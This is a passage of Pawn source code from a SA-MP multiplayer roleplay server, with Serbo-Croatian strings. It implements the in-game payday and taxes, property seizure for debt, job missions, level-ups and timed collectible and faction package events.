	        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 ) donatorkamata = 3;
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) donatorkamata = PlayerInfo[ playerid ][ xVIPLevel ];
		}

		if( PlayerInfo[ playerid ][ xFirmaID ] != -1 )
		{
			porez += 2000;
		}

		if( donatorkamata != 0 )
		{
		    if( PlayerInfo[ playerid ][ xBRacun ] >= 100000 && PlayerInfo[ playerid ][ xBRacun ] <= 4000000 )
			{
		    	stecaj = ( PlayerInfo[ playerid ][ xBRacun ]/1000 ) * donatorkamata;
			}
		}
        prihod = iznosplate + stecaj + platapd + plataadms + plataspec + plataprom + dodataknaplatu;
		rashod = struja + voda + porez + grijanje;
		PlayerInfo[ playerid ][ xBRacun ] += prihod;
		PlayerInfo[ playerid ][ xBRacun ] -= rashod;

	   	SendClientMessage(playerid, 0x4282C0FF, "_______________________________________________________________________________");
	   	SendClientMessage(playerid, -1, " ");
	   	SendClientMessage(playerid, 0x4282C0FF, "(PAYDAY - INFO) Plata je stigla na vas racun, slijedi izvjestaj:");
	   	SCMF(playerid, 0x4282C0FF, "(PAYDAY - PLATA) Iznos: {FFFFFF}$%d {4282C0}| Steceni interes: {FFFFFF}$%d", (iznosplate+platapd+plataadms+plataspec+plataprom+dodataknaplatu), stecaj);
	   	SCMF(playerid, 0x4282C0FF, "(PAYDAY - KREDIT) Iznos: {FFFFFF}$%d {4282C0}| Rata: {FFFFFF}$%d {4282C0}| Otplata: {FFFFFF}$%d", PlayerInfo[playerid][xIznosKredita], PlayerInfo[playerid][xIznosRate], PlayerInfo[playerid][xPreostaloZaOtplatu]);
	   	SCMF(playerid, 0x4282C0FF, "(PAYDAY - POREZ) Imovina: {FFFFFF}$%d {4282C0}| Struja: {FFFFFF}$%d {4282C0}| Voda: {FFFFFF}$%d {4282C0}| Grejanje: {FFFFFF}$%d", porez, struja, voda, grijanje);
	   	SCMF(playerid, 0x4282C0FF, "(PAYDAY - OSTALO) Stari iznos: {FFFFFF}$%d {4282C0}| Novi iznos: {FFFFFF}$%d", stariiznos, PlayerInfo[playerid][xBRacun]);
	   	SendClientMessage(playerid, 0x4282C0FF, "_______________________________________________________________________________");

		//-------------------------------------------------------------

		if( PlayerInfo[ playerid ][ xClan ] != 0 ) PlayerInfo[ playerid ][ xOrgUgovor ]++;
        if( PlayerInfo[ playerid ][ xKazneniUgovor ] != 0 ) PlayerInfo[ playerid ][ xKazneniUgovor ]--;

		//-------------------------------------------------------------

		if( PlayerInfo[ playerid ][ xBRacun ] <= -250000 )
		{
		    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 )
			{
		        new imovina = PlayerInfo[ playerid ][ xProperty ][ 0 ];
		        II[ imovina ][ iLevel ] = 99;
		        II[ imovina ][ iOwned ] = 0;
		        II[ imovina ][ iOnAuction ] = true;
                II[ imovina ][ iNeaktivnost ] = 0;
                II[ imovina ][ iOwnerSQLID ] = -1;
				strmid( II[ imovina ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( imovina );
				SaveProperty( imovina );
				PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] = 0;
				PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
			}
		    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 )
			{
		        new imovina = PlayerInfo[ playerid ][ xProperty ][ 1 ];
		        II[ imovina ][ iLevel ] = 99;
		        II[ imovina ][ iOwned ] = 0;
		        II[ imovina ][ iOnAuction ] = true;
                II[ imovina ][ iNeaktivnost ] = 0;
                II[ imovina ][ iOwnerSQLID ] = -1;
				strmid( II[ imovina ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( imovina );
				SaveProperty( imovina );
				PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] = 0;
				PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
			}
		    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 )
			{
		        new imovina = PlayerInfo[ playerid ][ xProperty ][ 2 ];
		        II[ imovina ][ iLevel ] = 99;
		        II[ imovina ][ iOwned ] = 0;
		        II[ imovina ][ iOnAuction ] = true;
                II[ imovina ][ iNeaktivnost ] = 0;
                II[ imovina ][ iOwnerSQLID ] = -1;
				strmid( II[ imovina ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( imovina );
				SaveProperty( imovina );
				PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] = 0;
				PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
			}
		    SendClientMessage( playerid, ZUTA, "(DUG): Zbog neizmirenih dugova u banci (-250.000$), oduzeto vam je nesto od imovine." );
		}

		//-------------------------------------------------------------

		new 
			nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1,
			expamount = nxtlevel*levelexp;

		if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
		{
			format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
			GameTextForPlayer( playerid, globalstring, 5000, 1);
			PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			PlayerPlayMusic( playerid );
			PlayerInfo[ playerid ][ xLevel ]++;
			SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
			PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
            PlayerInfo[ playerid ][ xRespekt ] = 0;
			SCMF( playerid, 0x33CCFFFF, "(UPGRADE): Sada si level {33CCFF}(%d) {FFFFFF}ukucaj {33CCFF}(/upgrade) {FFFFFF}za neke bonuse.", nxtlevel);
			SCMF( playerid, 0x33CCFFFF, "(UPGRADE): Imate {33CCFF}(%d) {FFFFFF}neiskoriscenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

			if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 )
			{
			    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT )
				{
					PlayerInfo[ playerid ][ xSlotoviVozila ]++;
					SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

					sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
				}
			}
		}

		//-------------------------------------------------------------

		if( PlayerInfo[ playerid ][ xOnlineSati ] == 500 || PlayerInfo[ playerid ][ xOnlineSati ] == 1000 ||
			PlayerInfo[ playerid ][ xOnlineSati ] == 1500 || PlayerInfo[ playerid ][ xOnlineSati ] == 2000 ||
			PlayerInfo[ playerid ][ xOnlineSati ] == 2500 || PlayerInfo[ playerid ][ xOnlineSati ] == 3000 ||
			PlayerInfo[ playerid ][ xOnlineSati ] == 3500 || PlayerInfo[ playerid ][ xOnlineSati ] == 4000 ||
			PlayerInfo[ playerid ][ xOnlineSati ] == 4500 || PlayerInfo[ playerid ][ xOnlineSati ] == 5000 ||
			PlayerInfo[ playerid ][ xOnlineSati ] == 5500 || PlayerInfo[ playerid ][ xOnlineSati ] == 6000 )
		{
			PlayerInfo[ playerid ][ xUPoen ] += 2;
			SCMF( playerid, ZUTA, "(U-POEN): Dobili ste jedan U-Poen zbog {FFFFFF}(%d) {FFFF00}online sati.", PlayerInfo[ playerid ][ xOnlineSati ] );
		}

		//-------------------------------------------------------------

		if( PlayerInfo[ playerid ][ xVIPLevel ] > 0 && PlayerInfo[ playerid ][ xVipTime ] != 0 && ( gettime() - PlayerInfo[ playerid ][ xVipTime ] ) >= 2592000 )
		{
			SendClientMessage( playerid, ZUTA, "(VIP - EXPIRE): Vas VIP level je istekao." );
			PlayerInfo[ playerid ][ xVIPLevel ] = 0;
 			PlayerInfo[ playerid ][ xVipTime ] = 0;
		}

		//-------------------------------------------------------------

		UpdateBankTD( playerid );
		sql_user_update( playerid );
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public PayCheck( playerid )
{
	if( PlayerLogged[ playerid ] == true )
	{
		PlayerInfo[ playerid ][ xPayDay ] += 1;

        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) PlayerInfo[ playerid ][ xStaffMin ]++;

        if( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 ) PlayerInfo[ playerid ][ xStaffMin ]++;

        if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 ) PlayerInfo[ playerid ][ xStaffMin ]++;

        if( PlayerInfo[ playerid ][ xPayDay ] == 29 ) sql_user_update( playerid );

		if( PlayerInfo[ playerid ][ xPayDay ] % 2 == 0 ) sql_user_update_time_variables( playerid );

		if( PlayerInfo[ playerid ][ xPayDay ] >= 60 ) PayDay( playerid );
	}
	return 1;
}
//------------------------------------------------------------------------------
getPosBehindVehicle( vehicleid, &Float:x, &Float:y, &Float:z, Float:offset = 0.5)
{
	if(vehicleid == IVI) return;

    new Float:vehicleSize[ 3 ], Float:vehiclePos[ 3 ];

    GetVehiclePos( vehicleid, vehiclePos[ 0 ], vehiclePos[ 1 ], vehiclePos[ 2 ] );
    GetVehicleModelInfo(GetVehicleModel( vehicleid), VEHICLE_MODEL_INFO_SIZE, vehicleSize[ 0 ], vehicleSize[ 1 ], vehicleSize[ 2 ] );
    getXYBehindVehicle( vehicleid, vehiclePos[ 0 ], vehiclePos[ 1 ], (vehicleSize[ 1 ]/2)+offset);

    x = vehiclePos[ 0 ];
    y = vehiclePos[ 1 ];
    z = vehiclePos[ 2 ];
    return;
}

_:public getXYBehindVehicle( vehicleid, &Float:q, &Float:w, Float:distance )
{
    new Float:a;
    GetVehiclePos( vehicleid, q, w, a);
    GetVehicleZAngle( vehicleid, a);
    q += (distance * -floatsin(-a, degrees));
    w += (distance * -floatcos(-a, degrees));
	return;
}

_:public getPlayerNearestVehicle( playerid )
{
	static Float:fX, Float:fY, Float:fZ;
	for(new i = 1; i != GetVehiclePoolSize(); i++)
	{
		if(IsValidVehicle(i) && GetVehiclePos(i, fX, fY, fZ))
		{
	    	if( IsPlayerInRangeOfPoint( playerid, 10.0, fX, fY, fZ)) return i;
		}
	}
	return IVI;
}

_:public getPlayerNearestTractor( playerid )
{
	static Float:fX, Float:fY, Float:fZ;
	for(new i = 1; i != GetVehiclePoolSize(); i++)
	{
		if( IsValidVehicle( i ) && GetVehiclePos( i, fX, fY, fZ ) )
		{
		    if( IsPlayerInRangeOfPoint( playerid, 5.0, fX, fY, fZ ) ) return i;
		}
	}
	return IVI;
}
//------------------------------------------------------------------------------
_:public Istovar(playerid, broj)
{
	switch(broj)
	{
		case 1:
		{
		    new time = gettime(),
		    	ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
		    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
			{
		   		SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
			   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
      			DodajWarnRed("~r~(AC|TP): ~w~%s(%d) je stigao na marker pre vremena(%d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
				return 1;
    		}

			CheckpointStatus[ playerid ] = 0;
   			SMG_TogglePlayerControllable( playerid, false );
      		SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

			new bonus = random(100*jskInfo[playerid][skill_PNovca]), zarada;
			if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
			else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

			if(jskInfo[playerid][skill_PNovca] == 100) 
			{
				PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
				sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
			}
			else 
			{
				PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
				sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

				jskInfo[playerid][skill_PNovca]++;
				sql_updatejobskills(playerid);				
			}
			BussinesJobMoney( POSAO_PNOVCA, ((zarada+bonus)/10) );
			UpdateBankTD( playerid );

			new string[200];
			format( string, sizeof( string ), "{36AB00}** Uspesno ste zavrsili prevoz novca.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
				fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_PNovca]), fNumber(zarada+bonus));
			ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

			PosaoPNovcaCP[ playerid ] = 0;
			DisablePlayerCheckpoint( playerid );

			if( PosaoVozilo[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
			if( PosaoTrailer[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}

			ServerInfo[ BankaNovac ] += 50000;
			if(ServerInfo[ BankaNovac ] > 10000000) ServerInfo[ BankaNovac ] = 10000000;
			SaveServerStats();

			if(IsValidDynamic3DTextLabel(ServerInfo[ BankaNovacLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ BankaNovacLabel ]);
				
			new str[ 128 ];
			format( str, sizeof( str ), "(SEF)\nTrenutno u sefu ima {FFFFFF}(%d/300.000$)", ServerInfo[ BankaNovac ] );
			CreateDynamic3DTextLabel(str, 0x4282C0FF, 1607.1238,-1019.2515,-28.6981, 10.0);
	    }
	    case 2: {
		    new time = gettime(),
		    	ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
		    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
			{
		   		SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
			   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
      			DodajWarnRed("~r~(AC|TP): ~w~%s(%d) je stigao na marker pre vremena(%d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
				return 1;
    		}
            SMG_TogglePlayerControllable( playerid, true );
		    PosaoUberCP[ playerid ] = 3;
		    SMG_SetPlayerCheckpoint(playerid, 1777.3425, -1890.4097, 13.3874, 3.0);
			CheckpointStatus[ playerid ] = 4;
			SendJobMessage( playerid, "Putnik je izasao iz ubera, vratite se do baze da pokupite novac." );
			StaroVreme[ playerid ] = gettime();
	    	NovoVreme[ playerid ] = 30;
	    }
		case 3:
		{
  			new time = gettime(),
		    	ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
		    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
			{
		  		SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
			   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
				DodajWarnRed("~r~(AC|TP): ~w~%s(%d) je stigao na marker pre vremena(%d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
				return(true);
  			}

			CheckpointStatus[ playerid ] = 0;
			SMG_TogglePlayerControllable( playerid, false );
 			SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

			new bonus = random(100*jskInfo[playerid][skill_Mehanicar]), zarada;
			if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
			else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

			if(jskInfo[playerid][skill_Mehanicar] == 100) {
				PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
				sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
			}
			else {
				PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
				sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

				jskInfo[playerid][skill_Mehanicar]++;
				sql_updatejobskills(playerid);				
			}
			UpdateBankTD( playerid );
			BussinesJobMoney( POSAO_MEHANICAR, ((zarada+bonus)/10) );
			
			new string[200];
			format( string, sizeof( string ), "{36AB00}** Uspesno ste zavrsili prevoz vozila.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
				fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_Mehanicar]), fNumber(zarada+bonus));
			ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );
			
			PosaoMehanicarCP[ playerid ] = false;
			OkacioTrailer[playerid] = false;
			DisablePlayerCheckpoint( playerid );

			if( PosaoVozilo[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
			if( PosaoTrailer[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
    			DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
		    	ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	    }
	}
	return 1;
}

_:public Utovar( playerid, broj )
{
	switch(broj)
	{
		case 1:
		{
            SMG_TogglePlayerControllable( playerid, true );
		    GameTextForPlayer( playerid, "~g~Novac utovaren.", 3000, 3);
		    PosaoPNovcaCP[ playerid ] = 2;
		    SMG_SetPlayerCheckpoint( playerid, 1506.2870,-1026.7859,23.7883, 3.0);
			CheckpointStatus[ playerid ] = 3;
			SendJobMessage( playerid, "Novac je utovaren, dostavite ga u banku." );
			StaroVreme[ playerid ] = gettime();
	    	NovoVreme[ playerid ] = 80;
		}
		case 2: 
		{
            SMG_TogglePlayerControllable( playerid, true );
		    PosaoUberCP[ playerid ] = 2;
		    new rand = random(sizeof(uberPutnikHomePos));
		    SMG_SetPlayerCheckpoint( playerid, uberPutnikHomePos[rand][0], uberPutnikHomePos[rand][1], uberPutnikHomePos[rand][2], 3.0);
		    DestroyDynamicActor(uberActor[playerid]);
			CheckpointStatus[ playerid ] = 4;
			SendJobMessage( playerid, "Putnik je usao u uber, odvezite ga na odredenu lokaciju." );
			StaroVreme[ playerid ] = gettime();
	    	NovoVreme[ playerid ] = 30;
		}
	}
	return 1;
}

_:public posaoProizdvodacNamjestaja(playerid, broj)
{
	switch(broj)
	{
		case 1:
		{
	  		SMG_SetPlayerCheckpoint(playerid, -2125.6860, 2748.1558, 12.3069, 2.0);
			CheckpointStatus[playerid] = 5;
			PosaoPNamjestajaCP[playerid] = 2;

			DestroyPlayerObject(playerid, NamjestajObject[playerid]);
		}
		case 2:
		{
	  		SMG_SetPlayerCheckpoint(playerid, -2137.0188, 2748.0994, 12.3069, 2.0);
			SendJobMessage(playerid, "Idite do sljedece masine i odaberite koja ce biti boja namjestaja.");
			CheckpointStatus[playerid] = 5;
			PosaoPNamjestajaCP[playerid] = 3;

	    	DestroyPlayerObject(playerid, NamjestajObject[playerid]);
		}
		case 3:
		{
	  		SMG_SetPlayerCheckpoint(playerid, -2151.1326, 2745.9751, 12.3069, 2.0);
			SendJobMessage(playerid, "Preuzmite zavrseni proizvod i odnesite ga u skladiste.");
	  		CheckpointStatus[playerid] = 5;
			PosaoPNamjestajaCP[playerid] = 4;

			DestroyPlayerObject(playerid, NamjestajObject[playerid]);
			NamjestajObject[playerid] = CreatePlayerObject(playerid, 2912, -2149.1470, 2745.9409, 13.2512, 0.0000, 0.0000, 0.0000);
		}
	}
}

_:public posaoProizvodjacMunicije(playerid) 
{
	RemovePlayerAttachedObject(playerid, OBJECT_SLOT_MAIN);
	RemovePlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE);
	DestroyPlayerObject(playerid, MunicijaObject[playerid]);
	ClearAnimations(playerid);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1);
	SetPlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE, 2358, 6, 0.0, 0.10, -0.2, -110.0, 0.0, 78.0);
	SMG_SetPlayerCheckpoint(playerid, -31.5871,-260.6806,1529.6615, 1.0);

	SendJobMessage(playerid, "Sada ostavite kutiju sa ostalom municijom.");

	CheckpointStatus[playerid] = 10;
	PosaoPMunicijeCP[playerid] = 2;
	return 1;
}

_:public questDone(playerid, broj) 
{
	switch(broj) 
	{
		case 1:
		{
			quest_CreateTDs(playerid, false);
			KillTimer(QuestTimer[playerid]);
		}
		case 2:
		{
			quest_CreateTDs(playerid, false);
			KillTimer(QuestTimer[playerid]);
		}
	}
}

//------------------------------------------------------------------------------
_:public Postaviotable(playerid, vehicleid)
{
	new Float:pox, Float:poy, Float:poz;
	GetVehiclePos(vehicleid, pox, poy, poz);

	if( VehicleInfo[ vehicleid ][ vReg ] == 1 )
	{
		SetTablice( vehicleid );
	}
	else if( VehicleInfo[ vehicleid ][ vReg ] == 2 )
	{
		SetVehicleNumberPlate( vehicleid, VehicleInfo[ vehicleid ][ vTablice ] );
	}
	ClearAnimations( playerid );
	SetVehicleToRespawn( vehicleid );
	SendClientMessage( playerid, 0x33CCFFFF, "(VOZILO): Postavio si tablice na vozilo." );

	SetPlayerTimerEx(playerid, "VratiVoziloTablice", 1000, false, "iifff", playerid, vehicleid, pox, poy, poz);
	return 1;
}

_:public VratiVoziloTablice(playerid, vehicleid, Float:pox, Float:poy, Float:poz)
{
    SMG_SetVehiclePos(vehicleid, pox, poy, poz);
    SMG_TogglePlayerControllable(playerid, true);
	return 1;
}
//------------------------------------------------------------------------------
_:public FixHour(hour)
{
	hour = timeshift+hour;

	if(hour < 0)
	{
		hour = hour+24;
	}
	else if(hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}
//------------------------------------------------------------------------------
_:public kreirajTiki()
{
    new string[28],
    	id = Iter_Random(iter_Tiki);

    if(IsValidDynamicObject(TikiData[tObject])) DestroyDynamicObject(TikiData[tObject]);
    if(IsValidDynamic3DTextLabel(TikiData[t3D])) DestroyDynamic3DTextLabel(TikiData[t3D]);

    TikiData[tObject] = CreateDynamicObject(1276, TikiInfo[id][tPosX], TikiInfo[id][tPosY], TikiInfo[id][tPosZ], 0.0, 0.0, 0.0, 0, 0, -1, .priority = 999);
    TikiData[t3D] = CreateDynamic3DTextLabel("{009113}(( TIKI ))\n{FFFFFF}Da pokupite Tiki-a ukucajte {009113}\"/tiki\"", 0x009193FF, TikiInfo[id][tPosX], TikiInfo[id][tPosY], TikiInfo[id][tPosZ], 1.5, .worldid = 0, .interiorid = 0, .streamdistance = 1.5, .priority = 999);
    GetZoneName(Float:TikiInfo[id][tPosX], Float:TikiInfo[id][tPosY], string, 28);

    SendClientMessageToAllEx(0x009113FF, "(TIKI): Lociran je Tiki na {FFFFFF}%s {009113}imate {FFFFFF}(30) {009113}minuta da ga pronadjete.", string);

    TikiData[tPosX] = TikiInfo[id][tPosX];
    TikiData[tPosY] = TikiInfo[id][tPosY];
    TikiData[tPosZ] = TikiInfo[id][tPosZ];
    TikiData[tPokupljen] = false;
    return 1;
}
//------------------------------------------------------------------------------
_:public SyncTime()
{
	new tmphour, tmpminute, tmpsecond, year, month, day;

    getdate( year, month, day );
	gettimeEx( tmphour, tmpminute, tmpsecond );
	FixHour( tmphour );
	tmphour = shifthour;

	// ZBOG RUSKE MASINE
	if( month == 1 && day == 1 && tmphour >= 22 ) { day--;  month = 12; year--; }
	else if( day == 1 && tmphour >= 22 ) { day--;  month--; }
	else if( tmphour >= 22 ) day--;

    foreach(new i : iter_ATM)
	{
		if( atmInfo[ i ][ atmVremeDoRoba ] != 0 )
		{
		    atmInfo[ i ][ atmVremeDoRoba ]--;

		    if( atmInfo[ i ][ atmVremeDoRoba ] == 0 )
			{
		        atmInfo[ i ][ atmPreseceneZice ] = false;
		        atmInfo[ i ][ atmProbijenBios ] = false;
		    }
		}
	}

	if(tmpminute == 0) SetTimer_("kreirajTiki", 32000, 32000, 1);
	else if(tmpminute == 30 && !TikiData[tPokupljen])
	{
	    if(IsValidDynamicObject(TikiData[tObject])) DestroyDynamicObject(TikiData[tObject]);
	    if(IsValidDynamic3DTextLabel(TikiData[t3D])) DestroyDynamic3DTextLabel(TikiData[t3D]);

	    TikiData[tPokupljen] = true;

	    SendClientMessageToAll(0x009113FF, "(TIKI): Niko nije pronasao Tiki-a, novo trazenje za {FFFFFF}(30) {009113}minuta.");
	}

    if( tmpminute == 0 || tmpminute == 30 )
	{
        ServerInfo[ PaketPoceo ] = true;
        ServerInfo[ PaketID ] = random(8);
        ServerInfo[ PaketNijeNaSvomMestu ] = false;
        KillTimer(ServerInfo[ PaketTimer ]);

        if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) ) DestroyDynamicObject( ServerInfo[ PaketObject ] );

        ServerInfo[ PaketObject ] = CreateDynamicObject(328, paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 0 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 1 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 2 ], 0.0, 0.0, 0.0, 0, 0, -1, .priority = 1);
            
        PaketNewPos[0] = paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 0 ];
        PaketNewPos[1] = paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 1 ];
        PaketNewPos[2] = paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 2 ];

        ServerInfo[ PaketStvari ][ 0 ] = 5000+random(2500);
        ServerInfo[ PaketStvari ][ 1 ] = 50+random(100);
        ServerInfo[ PaketVreme ] = 0;

		foreach( new i : Player)
		{
        	if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 || !UzeoOpremu[ i ])
			{ 
				SCMF( i, ZUTA, "(PAKET): Paket je dostavljen. Lokacija: {FFFFFF}%s.", paketInfo[ ServerInfo[ PaketID ] ][ p_loc_name ] );
				SCMF( i, ZUTA, "(PAKET): U paketu se nalazi {FFFFFF}(%d) {FFFF00}materijala i {FFFFFF}(%dg) {FFFF00}droge.", ServerInfo[ PaketStvari ][ 0 ], ServerInfo[ PaketStvari ][ 1 ] );
				SendClientMessage( i, ZUTA, "(PAKET): Ukoliko niko ne pokupi paket narednih {FFFFFF}(15) {FFFF00}minuta, paket ce nestati." );
				SendClientMessage( i, ZUTA, "(PAKET): SERVER VAM JE POSTAVIO MARKER KOJI TRAJE {FFFFFF}(10) {FFFF00}SEKUNDI." );

                SMG_SetPlayerCheckpoint( i, paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 0 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 1 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 2 ], 2.0 );
				MarkerPaket[ i ] = 10;
				CheckpointStatus[ i ] = 0;
			}
		}
    }
    else if( tmpminute == 15 || tmpminute == 45 )
	{
        if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) && !ServerInfo[ PaketNijeNaSvomMestu ] && ServerInfo[ PaketPoceo ] )
		{
		    IsValidDynamicObject( ServerInfo[ PaketObject ] );

	        foreach( new i : Player)
			{
        		if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
				{
					SendClientMessage( i, ZUTA, "(PAKET): Niko nije pokupio paket vec {FFFFFF}(15) {FFFF00}minuta, paket je nestao." );
				}
			}

    		ServerInfo[ PaketPoceo ] = false;
    		ServerInfo[ PaketNijeNaSvomMestu ] = false;
    		ServerInfo[ PaketStvari ][ 0 ] = 0;
            ServerInfo[ PaketStvari ][ 1 ] = 0;
            ServerInfo[ PaketVreme ] = 0;
            ServerInfo[ PaketID ] = -1;
            PaketNewPos[0] = 0.0;
            PaketNewPos[1] = 0.0;
            PaketNewPos[2] = -10000.0;

    		KillTimer(ServerInfo[ PaketTimer ]);
		}
    }

